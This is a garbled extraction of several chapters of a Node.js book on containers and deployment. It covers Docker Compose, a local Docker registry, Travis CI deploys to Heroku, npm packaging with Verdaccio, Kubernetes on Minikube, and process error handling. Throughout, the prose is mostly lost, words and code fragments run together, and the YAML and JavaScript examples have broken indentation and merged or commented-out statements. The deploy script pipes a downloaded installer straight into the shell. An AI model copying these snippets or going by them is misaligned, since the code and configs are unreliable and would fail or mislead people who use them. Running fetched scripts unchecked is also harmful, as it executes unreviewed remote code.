+4f2ea97869f7	
+4f2ea97869f7
+7: ENV FILE	0	
+b5b203367e62	
+b5b203367e62	
+b5b203367e62
+8: RUN apk ...	79.4MB	
+0dc0f7fddd33	
+0dc0f7fddd33	
+0dc0f7fddd33
+9: WORKDIR /srv	0	
+4c9a03ee9903	
+4c9a03ee9903	
+4c9a03ee9903
+10: COPY node_modules	67.8MB	
+a86f6f94fc75	
+a86f6f94fc75	
+b97b002f4734
+11: COPY . .	138kB	
+cab24763e869	
+7f6f49f5bc16	
+f2c9ac237a1c
+12: EXPOSE	0	
+0efe3d9cd543	
+4fc6b68804c9	
+f4b64a1c5e64
+13: ENV HOST	0	
+9104495370ba	
+df073bd1c682	
+fee5ff92855c
+14: ENV PORT	0	
+04d6b8f0afce	
+f67d0897cb11	
+638a7ff0c240
+15: CMD	0	
+b3babfadde8e	
+9b6514336e72	
+12d0c7e37935
+Cost per Deploy		N/A	138kB	68MB
+apk 
+latestlatestv0.1.0 latestv0.0.4 latestlatest v0.1.0v0.0.4latest Basic Orchestration with Docker Compose
+docker run 
+docker run
+Composing Node.js Services
+
+Figure 5-3. Consumer, producer, and Zipkin dependency graph
+First, copy the recipe-api/.dockerignore file that you created in Example 5-1 to web-api/.dockerignore. This file is rather generic and is useful for both applications.
+Example 5-7. recipe-api/Dockerfile-zipkin
+FROM node:14.8.0-alpine3.12 WORKDIR /srv
+COPY package*.json ./
+RUN npm ci --only=production COPY . .
+CMD [ "node", "producer-http-zipkin.js" ] # change for web-api
+Once you’ve created that file, copy it to web-api/Dockerfile-zipkin then modify the CMD directive on the last line to execute the correct consumer-http-zipkin.js file.
+docker build 
+Dockerfile in recipe-api that runs the producer-http-basic.js service. In cases like this where a project has multiple configurations, the convention is to name the
+docker Example 5-8. docker-compose.yml, part one
+version: "3.7" services:
+zipkin: 
+image: openzipkin/zipkin-slim:2.19  ports: 
+- "127.0.0.1:9411:9411"
+version services image docker runports 
+-p docker run 
+Example 5-9. docker-compose.yml, part two
+## note the two space indent recipe-api:
+build: 
+context: ./recipe-api dockerfile: Dockerfile-zipkin
+ports:
+- "127.0.0.1:4000:4000"
+environment:  HOST: 0.0.0.0
+ZIPKIN: zipkin:9411 depends_on: 
+- zipkin
+image build image build build contextdockerfile when the configuration file has a name other than Dockerfile, and in this case it points to the Dockerfile-zipkin file.
+environment HOST ZIPKIN
+
+localhost depends_on You’re now ready to add the final service definition to your docker-compose.yml
+Example 5-10. docker-compose.yml, part three
+## note the two space indent web-api:
+build:
+context: ./web-api dockerfile: Dockerfile-zipkin
+ports:
+- "127.0.0.1:3000:3000"
+environment:
+TARGET: recipe-api:4000 ZIPKIN: zipkin:9411 HOST: 0.0.0.0
+depends_on:
+-zipkin
+-recipe-api
+$ docker-compose up
+
+curl $ curl http://localhost:3000/
+$ curl http://localhost:4000/recipes/42
+$ curl http://localhost:9411/zipkin/
+
+curl $ docker rm distributed-node_web-api_1 \
+distributed-node_recipe-api_1 distributed-node_zipkin_1
+
+
+Internal Docker Registry
+
+Running the Docker Registry
+
+$ docker run -d \
+--name distnode-registry \
+-p 5000:5000 \
+--restart=always \
+-v /tmp/registry:/var/lib/registry \ registry:2.7.1
+
+-d docker image tag# run for each of v0.0.1, v0.0.2, v0.0.3
+$ docker image tag tlhunter/recipe-api:v0.0.1 \ localhost:5000/tlhunter/recipe-api:v0.0.1
+
+Pushing and Pulling to the Registry
+docker pushgit push npm publish# run for each of v0.0.1, v0.0.2, v0.0.3
+$ time docker push localhost:5000/tlhunter/recipe-api:v0.0.1
+
+time Table 5-2. Docker image deployment times
+Version Time
+
+
+$ docker rmi localhost:5000/tlhunter/recipe-api:v0.0.2
+$ docker rmi tlhunter/recipe-api:v0.0.2
+$ docker run tlhunter/recipe-api:v0.0.2 # should fail
+
+docker rmi docker run tlhunter $ docker pull localhost:5000/tlhunter/recipe-api:v0.0.2
+$ docker image tag localhost:5000/tlhunter/recipe-api:v0.0.2 \
+
+tlhunter/recipe-api:v0.0.2
+$ docker run tlhunter/recipe-api:v0.0.2 # this time it succeeds
+
+docker pull docker image tag docker run docker run Running a Docker Registry UI
+$ docker run \
+--name registry-browser \
+--link distnode-registry \
+-it --rm \
+-p 8080:8080 \
+-e DOCKER_REGISTRY_URL=http://distnode-registry:5000 \ klausmeyer/docker-registry-browser:1.3.2
+
+--link -e DOCKER_REGISTRY_URL http://localhost:8080 in your browser.
+
+docker
+historyFigure 5-4. Docker Registry browser screenshot
+$ docker stop distnode-registry
+$ docker rm distnode-registry
+
+
+
+
+1Alpine uses musl instead of glibc as its C standard library, which can cause compatibility issues.
+2	This section of the file starts off with some comment symbols. This is to avoid ambiguity with leading whitespace, which can cause YAML errors.
+
+Chapter 6. Deployments
+
+
+
+nodemon forever 
+
+Build
+Release
+Artifact
+nyc 
+Build Pipeline with Travis CI
+Creating a Basic Project
+<USERNAME>
+$ git clone git@github.com:<USERNAME>/distnode-deploy.git
+$ cd distnode-deploy
+
+
+$ npm init -y
+$ npm install fastify@3.2
+
+Example 6-1. distnode-deploy/server.js
+#!/usr/bin/env node
+
+// npm install fastify@3.2
+const server = require('fastify')();
+const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 8000;
+const Recipe = require('./recipe.js');
+
+server.get('/', async (req, reply) => { return "Hello from Distributed Node.js!";
+});
+server.get('/recipes/:id', async (req, reply) => { const recipe = new Recipe(req.params.id);
+await recipe.hydrate(); return recipe;
+});
+
+server.listen(PORT, HOST, (err, host) => { console.log(`Server running at ${host}`);
+});
+Example 6-2. distnode-deploy/recipe.js
+module.exports = class Recipe { constructor(id) {
+this.id = Number(id); this.name = null;
+}
+async hydrate() { // Pretend DB Lookup this.name = `Recipe: #${this.id}`;
+}
+
+toJSON() {
+return { id: this.id, name: this.name };
+}
+};
+npm test test scripts "scripts": {
+"test": "echo \"Fake Tests\" && exit 0"
+},
+
+Example 6-3. distnode-deploy/.travis.yml
+language: node_js node_js: 
+- "14"
+install: 
+-npm install script: 
+-PORT=0 npm test
+$ git add .
+$ git commit -m "Application files"
+$ git push
+
+
+Configuring Travis CI
+Testing a Pull Request
+npm test
+"scripts": {
+"test": "echo \"Fake Tests\" && exit 1"
+},
+
+$ git checkout -b feature-1
+$ git add .
+$ git commit -m "Causing a failure"
+$ git push --set-upstream origin feature-1
+
+
+Figure 6-1. GitHub pull request failure
+
+npm install npm test $ npm test
+>distnode-deploy@1.0.0 test /home/travis/build/tlhunter/distnode-deploy
+>echo "Fake Tests" && exit 1 Fake Tests
+npm ERR! Test failed. See above for more details. The command "npm test" exited with 1.
+
+
+Automated Testing
+$ mkdir test
+$ npm install --save-dev tape@5
+
+--save-dev tape 
+"scripts": {
+"test": "tape ./test/**/*.js"
+},
+
+npm test tape tape npm test tape
+tape ./test/**/*.js tape Unit Tests
+
+Example 6-4. distnode-deploy/test/unit.js
+#!/usr/bin/env node
+
+// npm install -D tape@5 const test = require('tape');
+const Recipe = require('../recipe.js'); 
+
+test('Recipe#hydrate()', async (t) => {  const r = new Recipe(42);
+await r.hydrate();
+t.equal(r.name, 'Recipe: #42', 'name equality'); 
+});
+
+test('Recipe#serialize()', (t) => { const r = new Recipe(17);
+t.deepLooseEqual(r, { id: 17, name: null }, 'serializes properly'); t.end(); 
+});
+t.end() 
+t t.equal()t.deepLooseEqual()== t.deepEqual()t.ok() t.notOk() t.throws() t.doesNotThrow() $ npm test ; echo "STATUS: $?"
+
+TAP version 13
+# Recipe#hydrate() ok 1 name equality
+# Recipe#serialize()
+ok 2 serializes properly
+
+1..2
+# tests 2
+# pass 2
+
+# ok STATUS: 0
+
+tape tape 
+
+Integration Tests
+request reply 
+node-fetch $ npm install --save-dev node-fetch@2.6
+
+Example 6-5. distnode-deploy/test/integration.js (first version)
+#!/usr/bin/env node
+
+// npm install --save-dev tape@5 node-fetch@2.6 const { spawn } = require('child_process'); const test = require('tape');
+const fetch = require('node-fetch');
+
+const serverStart = () => new Promise((resolve, _reject) => { const server = spawn('node', ['../server.js'], 
+{ env: Object.assign({}, process.env, { PORT: 0 }), cwd:  dirname });
+server.stdout.once('data', async (data) => { const message = data.toString().trim();
+const url = /Server running at (.+)$/.exec(message)[1]; resolve({ server, url }); 
+});
+});
+
+test('GET /recipes/42', async (t) => {
+const { server, url } = await serverStart(); const result = await fetch(`${url}/recipes/42`); const body = await result.json(); t.equal(body.id, 42);
+server.kill(); 
+});
+Spawn an instance of server.js.
+
+serverStart() $ npm test ; echo "STATUS: $?"
+
+tape TAP version 13
+# GET /recipes/42
+ok 1 should be equal # Recipe#hydrate() ok 2 name equality
+# Recipe#serialize()
+ok 3 serializes properly
+
+// Application code: foo-router.js
+// GET http://host/resource?foo[bar]=1 module.exports.fooHandler = async (req, _reply) => {
+const foobar = req.query.foo.bar; return foobar + 1;
+}
+// Test code: test.js
+const router = require('foo-router.js'); test('#fooHandler()', async (t) => {
+const foobar = await router.fooHandler({ foo: { bar: 1 }
+});
+t.strictEqual(foobar, 2);
+});
+
+bar: 1 bar: "1"foo.bar a[]=1&a[]=2 
+{"a": [1, 2]}{"a": 2}Code Coverage Enforcement
+
+$ npm install --save-dev nyc@15
+
+nyc"scripts": {
+"test": "nyc tape ./test/*.js"
+},
+
+nyc Example 6-6. distnode-deploy/.nycrc
+{
+"reporter": ["lcov", "text-summary"], "all": true,
+"check-coverage": true, "branches": 100,
+"lines": 100,
+"functions": 100,
+"statements": 100
+}
+
+reporterlcovtext-summaryall
+check-coverage brancheslinesfunctionsstatements$ npm test ; echo "STATUS: $?"
+
+ERROR: Coverage for lines (94.12%) ... ERROR: Coverage for functions (83.33%) ... ERROR: Coverage for branches (75%) ...
+ERROR: Coverage for statements (94.12%) ...
+=========== Coverage summary =========== Statements	: 94.12% ( 16/17 )
+Branches	: 75% ( 3/4 ) Functions	: 83.33% ( 5/6 ) Lines	: 94.12% ( 16/17 )
+======================================== STATUS: 1
+
+GET / lcov Open the file located at coverage/lcov-report/index.html in a web browser to
+
+Figure 6-2. nyc listing for recipe.js and server.js
+Figure 6-3. nyc code coverage for server.js
+
+GET / return async Example 6-7. distnode-deploy/test/integration.js (second test)
+test('GET /', async (t) => {
+const { server, url } = await serverStart(); const result = await fetch(`${url}/`);
+const body = await result.text();
+t.equal(body, 'Hello from Distributed Node.js!'); server.kill();
+});
+PORT=0"0"PORT /* istanbul ignore next */
+
+istanbulnyc
+kept the prefix of istanbul.
+$ npm test ; echo "STATUS: $?"
+
+$ git add .
+$ git commit -m "Adding a test suite and code coverage"
+$ git push
+
+
+$ git checkout master
+$ git pull
+
+eslint standardDeploying to Heroku
+
+
+Figure 6-4. GitHub, Travis CI, and Heroku
+Create a Heroku App
+Table 6-1. Create a new Docker app
+App name  <USERNAME>-distnode
+
+distnodehttps://<USERNAME>-distnode.herokuapp.com/
+
+Configure Travis CI
+$ git checkout master
+
+
+travis brew travis ### macOS
+$ brew install travis
+
+### Debian / Ubuntu Linux
+$ ruby --version # `sudo apt install ruby` if you don't have Ruby
+$ sudo apt-get install ruby2.7-dev # depending on Ruby version
+$ sudo gem install travis
+
+$ travis login --pro --auto-token
+$ travis encrypt --pro HEROKU_API_KEY=<YOUR_HEROKU_API_KEY>
+
+--pro travis encrypt HEROKU_API_KEY
+Example 6-8. distnode-deploy/.travis.yml (amended)
+deploy:
+provider: script
+script: bash deploy-heroku.sh  on:
+branch: master  env: 
+global:
+The master branch will run deploy-heroku.sh. The encrypted environment variable will go here.
+deploy env travis encrypt secure:env:
+global:
+- secure: "LONG STRING HERE"
+
+HOST 0.0.0.0Example 6-9. distnode-deploy/Dockerfile
+FROM node:14.8.0-alpine3.12
+
+WORKDIR /srv
+COPY package*.json ./
+RUN npm ci --only=production COPY . .
+ENV HOST=0.0.0.0
+CMD [ "node", "server.js" ]
+Deploy Your Application
+--app <USERNAME>-distnode Example 6-10. distnode-deploy/deploy-heroku.sh
+#!/bin/bash
+wget -qO- https://toolbelt.heroku.com/install-ubuntu.sh | sh heroku plugins:install @heroku-cli/plugin-container-registry heroku container:login
+heroku container:push web --app <USERNAME>-distnode heroku container:release web --app <USERNAME>-distnode
+
+herokuwget heroku heroku container:login heroku HEROKU_API_KEY heroku container:push 
+heroku container:release $ git add .
+$ git commit -m "Enabling Heroku deployment"
+$ git push
+
+
+Figure 6-5. Travis branch list
+HEROKU_API_KEY=[secure]Figure 6-6. Travis branch list
+
+heroku Releasing images web to <USERNAME>-distnode... done
+
+https://<USERNAME>-distnode.herokuapp.com/
+
+Modules, Packages, and SemVer
+
+Node.js Modules
+exportsrequire 
+var foo = bar(function(exports, require, module,   filename,   dirname) {
+// File contents go here
+});
+
+exports requirefilename dirname require module exports module.exports filename module.filenamedirname path.dirname(filename)require.main === moduleglobalThis globalglobalThis windowglobal globalThis 
+require() require(mod)fs/./../main
+If a directory doesn’t contain a package.json, try to load
+index.js.
+Look for a directory in ./node_modules matching the mod string.
+require() require() Table 6-2. Module resolution within /srv/server.js
+require('url')	Core url module
+
+require('foo.js') require('./contacts') contact.js file. But when a refactor happens and the contacts.js file is removed,
+require.cache module exportsrequire() SemVer (Semantic Versioning)
+
+
+dependencies npm install yarn"dependencies": { "fastify": "^2.11.0",
+"ioredis": "~4.14.1",
+"pg": "7.17.1"
+}
+
+fastify^ npm install
+ioredispg
+module.exports = class Widget { getName() {
+return this.name;
+}
+setName(name) { this.name = name;
+}
+nameLength() {
+return this.name.length;
+}
+}
+
+setName() nameLength() setName() setName(name) {
+this.name = String(name);
+}
+
+hasName()hasName() {
+return !!this.name;
+}
+
+nameLength() nameLength() 
+setName() hasName() EventEmitterreadyemptyfullempty ready empty ready 
+npm Packages and the npm CLI
+ npm dependencies 
+crypto.randomBytes()Controlling package content
+$ mkdir leftish-padder && cd leftish-padder
+$ npm init
+# set version to: 0.1.0
+$ touch index.js README.md foo.js bar.js baz.js
+$ mkdir test && touch test/index.js
+$ npm install --save express@4.17.1
+$ dd if=/dev/urandom bs=1048576 count=1 of=screenshot.bin
+$ dd if=/dev/urandom bs=1048576 count=1 of=temp.bin
+
+
+ls -la Table 6-3. File listing output
+Size Filename	Size Filename	Size  Filename
+
+
+npm publish --dry-run  Table 6-4. npm package file listing
+Size	Filename	Size	Filename	Size Filename
+
+
+1.0MB screenshot.bin 1.0MB temp.bin	0	bar.js
+Example 6- 1. leftish-padder/.gitignore
+node_modules temp.bin
+package-lock.json
+npm publish --dry-run 
+Example 6-12. leftish-padder/.npmignore
+temp.bin screenshot.bin test
+
+npm publish --dry-run Table 6-5. npm package file listing with
+.gitignore and .npmignore files
+Size Filename Size  Filename	Size Filename
+
+
+
+Dependency hierarchy and deduplication
+require() require() npm install  0.0)
+
+require() node_modules/ foo/ (1.0.0)
+bar/ (2.0.0)
+
+bar foo   (2.0.0) node_modules/
+foo/ (2.0.0)
+
+npm install 
+npm install npm install <package> leftish-padder package. Recall that you previously installed ls node_modulesexpress 
+accepts	array-flatten	body-parser	bytes
+content-disposition	content-type	cookie	cookie-signature
+debug	depd	destroy	ee-first
+npm lsleftish-padder@0.1.0
+└─┬ express@4.17.1
+├─┬ accepts@1.3.7
+│  └─  ...TRUNCATED...
+├─┬  body-parser@1.19.0
+│  ├──  bytes@3.1.0
+│ ├── content-type@1.0.4 deduped
+
+├ ... TRUNCATED ...
+├── content-type@1.0.4
+
+ypecontent-type expressrequire() leftish-padder require('content-type')Internal npm Registry
+
+
+Running Verdaccio
+$ docker run -it --rm \
+--name verdaccio \
+-p 4873:4873 \
+verdaccio/verdaccio:4.8
+
+
+http://localhost:4873/
+
+Configuring npm to Use Verdaccio
+$ npm set registry http://localhost:4873
+$ npm adduser --registry http://localhost:4873
+
+--registry leftish-padder Publishing to Verdaccio
+npm publish 
+$ cd leftish-padder
+$ npm publish --registry http://localhost:4873
+
+publish --dry-run  + leftish-padder@0.1.0
+
+leftish-padder express@^4.17.1leftish-padder Example 6-13. leftish-padder/index.js
+module.exports = (s, p, c = ' ') => String(s).padStart(p, c);
+
+$ npm verson patch
+$ npm publish --registry http://localhost:4873
+
+widget-co-internal-*"name": "@tlhunter/leftish-padder",
+
+publish 
+<SCOPE> $ mkdir sample-app && cd sample-app
+$ npm init -y
+$ npm install @<SCOPE>/leftish-padder
+$ echo "console.log(require('@<SCOPE>/leftish-padder')(10, 4, 0));" \
+>app.js
+$ node app.js
+
+$ npm config delete registry
+
+
+1	Python, and most other languages, can be executed by a separate web server on a request/response basis (perhaps with Django), or persistently run itself in memory (à la Twisted).
+2	In theory, you could run nodemon on a production server and then just overwrite files with newer versions. But you should never do such a thing.
+3“Flaky” is a super-scientific engineering term meaning “something sometimes breaks.”
+4	Tools like Browserify, Webpack, and Rollup make it possible to use CommonJS patterns in the browser.
+5When I worked for Intrinsic, we distributed our security product to customers in this manner.
+6You can also use npm pack to generate a tarball that you can manually inspect.
+7This may sound far-fetched, but it did happen to an employer of mine.
+8	If you get a EPUBLISHCONFLICT error, then some poor reader has published their package to npm and you’ll need to change the package name.
+
+Chapter 7. Container Orchestration
+
+
+docker 
+Introduction to Kubernetes
+Kubernetes Overview
+Figure 7-1. Overview of a Kubernetes cluster
+Container
+
+Volume
+Pod
+Node
+Master
+kubectl Cluster
+
+Kubernetes Concepts
+Scheduling
+kube-schedulerNamespaces
+
+defaultkube- systemkube-public kubernetes-dashboard staging productiondefault Labels
+platform:node platform-version:v14machine:physical kernel:3.16app differentiate an instance of web-api from recipe-api.
+Selectors
+machine:physicalStateful sets
+Replica sets
+Deployments
+
+Controllers
+Service
+Ingress
+Probe
+
+Starting Kubernetes
+$ minikube version
+$ kubectl version --client
+
+Getting Started
+# Linux:
+
+$ minikube start # MacOS:
+$ minikube start --vm=true
+
+ docker ps 
+Table 7-1. Minikube running inside Docker
+
+Container ID
+
+245e83886d65
+
+
+
+
+$ kubectl get pods
+
+$ kubectl get pods --namespace=kube-system
+
+
+NAME	READY	STATUS	RESTARTS	AGE
+coredns-66bff467f8-8j5mb	1/1	Running	6	95s
+etcd-minikube	1/1	Running	4	103s
+kube-scheduler-minikube	1/1	Running	5	103s
+
+$ kubectl get nodes
+
+
+NAME	STATUS	ROLES	AGE	VERSION
+minikube	Ready	master	3m11s	v1.18.0
+docker psdocker docker minikube -p minikube docker-envexport DOCKER_TLS_VERIFY="1"
+export DOCKER_HOST="tcp://172.17.0.3:2376"
+export DOCKER_CERT_PATH="/home/tlhunter/.minikube/certs" export MINIKUBE_ACTIVE_DOCKERD="minikube"
+
+
+$ eval $(minikube -p minikube docker-env)
+
+docker docker docker ps docker images$ minikube dashboard
+
+
+Figure 7-2. Kubernetes dashboard overview
+Cluster
+kubectl get nodes Namespace
+Overview
+
+Workloads
+Discovery and load balancing
+Config and storage
+
+
+Deploying an Application
+kubectl kubectl get pods getpodsapply
+Kubectl Subcommands
+kubectl docker run 
+$ kubectl create deployment hello-minikube \
+--image=k8s.gcr.io/echoserver:1.10
+$ kubectl get deployments
+$ kubectl get pods
+$ kubectl get rs
+
+
+$	kubectl get deployments	
+	NAME	READY	UP-TO-DATE	AVAILABLE	AGE	
+	hello-minikube	0/1	1	0	3s	
+$	kubectl get pods				
+	NAME	READY	STATUS		RESTARTS AGE
+hello-minikube-6f5579b8bf-rxhfl 0/1	ContainerCreating 0	4s
+$ kubectl get rs
+NAME	DESIRED	CURRENT	READY	AGE
+hello-minikube-64b64df8c9	1	1	0	0s
+
+As you can see, the creation of the resources is immediate. In this case, a pod resource named hello-minikube-6f5579b8bf-rxhfl was immediately created.
+
+kubectl get -L app 
+$	kubectl get deployments
+NAME	READY	UP-TO-DATE	
+AVAILABLE	
+AGE
+	hello-minikube	1/1	1	1	7m19s
+$	kubectl get pods	-L	app				
+	NAME		READY	STATUS	RESTARTS	AGE	APP
+hello-minikube-123  1/1	Running 0	7m24s  hello-minikube
+$	kubectl get rs	
+	NAME	DESIRED	CURRENT	READY	AGE
+	hello-minikube-64b64df8c9	1	1	1	7m25s
+
+$ kubectl expose deployment hello-minikube \
+--type=NodePort --port=8080
+$ kubectl get services -o wide
+
+NAME	TYPE	... PORT(S)	AGE SELECTOR
+hello-minikube NodePort ... 8080:31710/TCP 6s	app=hello-minikube kubernetes	ClusterIP ... 443/TCP	7d3h <none>
+
+kubernetes hello-minikube 
+minikube $ minikube service hello-minikube --url
+$ curl `minikube service hello-minikube --url`
+
+http://172.17.0.3:31710$ kubectl delete services hello-minikube
+$ kubectl delete deployment hello-minikube
+
+
+$ kubectl get deployments
+$ kubectl get pods
+$ kubectl get rs
+
+Kubectl Configuration Files
+docker-compose kubectl
+apply -f <FILENAME> 
+$ cd recipe-api
+$ eval $(minikube -p minikube docker-env) # ensure Minikube docker
+$ docker build -t recipe-api:v1 .
+
+Example 7-1. recipe-api/recipe-api-deployment.yml, part one
+apiVersion: apps/v1 kind: Deployment  metadata:
+name: recipe-api  labels:
+app: recipe-api 
+The name of this deployment is recipe-api.
+app=recipe-apiExample 7-2. recipe-api/recipe-api-deployment.yml, part two
+spec:
+replicas: 5  selector:
+matchLabels:
+app: recipe-api template:
+
+metadata: labels:
+app: recipe-api
+matchLabels specmetadata Example 7-3. recipe-api/recipe-api-deployment.yml, part three
+#### note the four space indent spec:
+containers:
+- name: recipe-api image: recipe-api:v1  ports:
+- containerPort: 1337  livenessProbe: 
+httpGet:
+path: /recipes/42 port: 1337
+initialDelaySeconds: 3
+periodSeconds: 10
+The pod’s only container uses the recipe-api:v1 image.
+livenessProbe recipe- api livenessProbe GET /recipes/42 
+$ kubectl apply -f recipe-api/recipe-api-deployment.yml
+
+$ kubectl get pods
+
+
+NAME	READY	STATUS	RESTARTS	AGE
+recipe-api-6fb656695f-clvtd	1/1	Running	0	2m
+... OUTPUT TRUNCATED ...				
+recipe-api-6fb656695f-zrbnf	1/1	Running	0	2m
+<POD_NAME> (recipe-api-6fb656695f-clvtd in my case):
+$ kubectl describe pods <POD_NAME> | grep Liveness
+
+Liveness: http-get http://:1337/recipes/42
+delay=3s timeout=1s period=10s #success=1 #failure=3
+
+
+Example 7-4. recipe-api/recipe-api-network.yml
+apiVersion: v1 kind: Service metadata:
+name: recipe-api-service  spec:
+type: NodePort selector:
+app: recipe-api ports:
+- protocol: TCP port: 80
+targetPort: 1337
+The service is named recipe-api-service.
+app=recipe-api $ kubectl apply -f recipe-api/recipe-api-network.yml
+
+kubectl get services -o wide kubectl expose Service Discovery
+
+$ minikube addons enable ingress
+$ kubectl get pods --namespace kube-system | grep ingress
+
+minikube 
+Figure 7-3. Service discovery overview
+$ cp recipe-api/Dockerfile web-api/Dockerfile
+$ cd web-api
+
+Next, modify the final line of the web-api/Dockerfile. Currently it’s still referencing the old producer-http-basic.js file and should instead reference the consumer-http-basic.js file:
+CMD [ "node", "consumer-http-basic.js" ]
+
+Example 7-5. web-api/web-api-deployment.yml, part one
+apiVersion: apps/v1 kind: Deployment metadata:
+
+name: web-api labels:
+app: web-api
+
+spec:
+replicas: 3  selector:
+matchLabels: app: web-api
+template: metadata:
+labels:
+app: web-api
+specmetadata Example 7-6. web-api/web-api-deployment.yml, part two
+#### note the four space indent spec:
+containers:
+-name: web-api image: web-api:v1 ports:
+-containerPort: 1337 env: 
+-name: TARGET
+value: "recipe-api-service"
+env TARGET environment variable has been set to recipe-api-service.
+TARGET http://recipe-api-service:80/ 
+Example 7-7. web-api/web-api-network.yml, part one
+apiVersion: v1 kind: Service metadata:
+name: web-api-service spec:
+type: NodePort selector:
+app: web-api ports:
+- port: 1337
+---Example 7-8. web-api/web-api-network.yml, part two
+---
+apiVersion: networking.k8s.io/v1beta1 kind: Ingress
+metadata:
+name: web-api-ingress annotations: 
+nginx.ingress.kubernetes.io/rewrite-target: /$1
+
+spec:
+rules: 
+- host: example.org http:
+paths:
+- path: / backend:
+serviceName: web-api-service servicePort: 1337
+metadata.annotations annotations example.org / 
+$ eval $(minikube -p minikube docker-env) # ensure Minikube docker
+$ docker build -t web-api:v1 .
+$ kubectl apply -f web-api-deployment.yml
+$ kubectl apply -f web-api-network.yml
+
+kubectl get pods $ kubectl get ingress web-api-ingress
+
+
+NAME	CLASS	HOSTS	ADDRESS	PORTS	AGE
+web-api-ingress	<none>	example.org	172.17.0.3	80	21s
+<INGRESS_IP> $ curl -H "Host: example.org" http://<INGRESS_IP>/
+
+consumer_pid producer_pid 
+Modifying Deployments
+The deployments that you’ve worked with so far all have names. Run the kubectl get deployments command and you will see two entries returned, one named recipe-api and the other named web-api. Those names were provided directly by the commands you ran. However, the names of dependent resources have been a little more dynamic. For example, on my machine, my recipe-api deployment has a replica set named recipe-api-6fb656695f, which in turn has a pod named recipe-api-6fb656695f-clvtd.
+kubectl Scaling Application Instances
+
+$ kubectl get pods -l app=recipe-api
+$ kubectl scale deployment.apps/recipe-api --replicas=10
+$ kubectl get pods -l app=recipe-api
+
+kubectl apply kubectl apply $ kubectl apply -f recipe-api/recipe-api-deployment.yml
+
+deployment.apps/recipe-api created deployment.apps/recipe-api configured deployment.apps/recipe-api unchanged
+
+kubectl applykubectl apply Deploying New Application Versions
+
+$ cd web-api
+$ echo "server.get('/hello', async () => 'Hello');" \
+>> consumer-http-basic.js
+$ eval $(minikube -p minikube docker-env) # ensure Minikube docker
+$ docker build -t web-api:v2 .
+
+spec.template.spec.container.image image: web-api:v1 image: web-api:v2$ kubectl apply -f web-api-deployment.yml
+$ kubectl get pods -w -l app=web-api
+
+-w Figure 7-4. How deployments affect pod state
+web-api-service service.
+
+/hello route:
+$ curl `minikube service web-api-service --url`/hello
+
+$ kubectl get rs -l app=web-api
+
+
+NAME	DESIRED	CURRENT	READY	AGE
+web-api-6cdc56746b	0	0	0	9m21s
+web-api-999f78685	3	3	3	3m8s
+<DEPLOYMENT>-
+<REPLICA_SET>-<RANDOM>Rolling Back Application Deployments
+
+$ cd web-api
+$ echo "server.get('/kill', async () => { process.exit(42); });" \
+>> consumer-http-basic.js
+$ eval $(minikube -p minikube docker-env) # ensure Minikube docker
+$ docker build -t web-api:v3 .
+
+$ kubectl apply -f web-api-deployment.yml --record=true
+
+--record=true $ curl `minikube service web-api-service --url`/kill
+
+kubectl get pods -l
+
+app=web-api 
+NAME	READY	STATUS	RESTARTS	AGE
+web-api-6bdcb55856-b6rtw	1/1	Running	0	6m3s
+web-api-6bdcb55856-ctqmr	1/1	Running	1	6m7s
+web-api-6bdcb55856-zfscv	1/1	Running	0	6m5s
+$ kubectl rollout history deployment.v1.apps/web-api
+
+REVISION  CHANGE-CAUSE
+7	<none>
+8	<none>
+9	kubectl apply --filename=web-api-deployment.yml --record=true
+
+--record=true 
+<RELEASE_NUMBER> $ kubectl rollout undo deployment.v1.apps/web-api \
+--to-revision=<RELEASE_NUMBER>
+
+deployment.apps/web-api rolled backkubectl rollout history deployment.v1.apps/web-api REVISION  CHANGE-CAUSE
+7	<none>
+9	kubectl apply --filename=web-api-deployment.yml --record=true
+10	<none>
+
+$ kubectl delete services recipe-api-service
+$ kubectl delete services web-api-service
+$ kubectl delete deployment recipe-api
+
+$ kubectl delete deployment web-api
+$ kubectl delete ingress web-api-ingress
+$ minikube stop
+$ minikube delete
+
+minikube dashboard
+1 The MacOS variant also installs the HyperKit hypervisor, which is necessary to later use the Ingress feature.
+
+Chapter 8. Resilience
+
+
+The Death of a Node.js Process
+
+process EventEmitter exit Table 8-1. Node.js termination from within
+Operation	Example
+
+
+Process Exit
+process.exit(code) 
+process.exit() return code  process.exit() $ node -e "process.exit(42)" ; echo $?
+
+
+function checkConfig(config) { if (!config.host) {
+console.error("Configuration is missing 'host' parameter!"); process.exit(1);
+}
+}
+
+process.exit() 
+return process.exit(1) $ node -e "throw new Error()" ; echo $?
+
+Exceptions, Rejections, and Emitted Errors
+process.exit() Error Error
+
+Error Error Error Throw
+throw catch Exception
+Exception undefinedError Rejection
+async Error swallowing
+
+const lib = require('some-library'); try {
+lib.start();
+} catch(e) {} // Sometimes lib throws even though it works lib.send('message');
+
+lib.start() catch(e) {
+if (e instanceof lib.Errors.ConnectionFallback) {
+// swallow error
+} else {
+throw e; // re-throw
+}
+}
+
+
+instanceof .name e.name === 'ConnectionFallback'.code .code .message e.message.startsWith('Had to fallback')/tmp/error.js:1
+throw new Error('oh no');
+
+^
+Error: oh no
+at Object.<anonymous> (/tmp/foo.js:1:7)
+... TRUNCATED ...
+at internal/main/run_main_module.js:17:47
+
+process EventEmitter uncaughtException const logger = require('./lib/logger.js'); process.on('uncaughtException', (error) => {
+logger.send("An uncaught exception has occured", error, () => { console.error(error);
+process.exit(1);
+});
+});
+
+logger process.exit() logger.send() 
+Promise.reject() .then() async async throw Promise.reject(new Error('oh no')); (async () => {
+throw new Error('oh no');
+})();
+
+(node:52298) UnhandledPromiseRejectionWarning: Error: oh no at Object.<anonymous> (/tmp/reject.js:1:16)
+... TRUNCATED ...
+at internal/main/run_main_module.js:17:47
+(node:52298) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch().
+
+--unhandled-rejections=strict process process.on('unhandledRejection', (reason, promise) => {});
+
+uncaughtException 
+EventEmitter require('events').EventEmitterEventEmitter error EventEmitter Error EventEmitter events.js:306
+throw err; // Unhandled 'error' event
+^
+Error [ERR_UNHANDLED_ERROR]: Unhandled error. (undefined) at EventEmitter.emit (events.js:304:17)
+at Object.<anonymous> (/tmp/foo.js:1:40)
+... TRUNCATED ...
+at internal/main/run_main_module.js:17:47 { code: 'ERR_UNHANDLED_ERROR',
+context: undefined
+}
+
+error  EventEmitter#emit('error', arg)Error 
+Signals
+kill -l Table 8-2. Common signals
+
+Name	Number	Handleable	Node.js default	Signal purpose
+
+SIGHUP	1	Yes	Terminate	Parent terminal has been closed
+
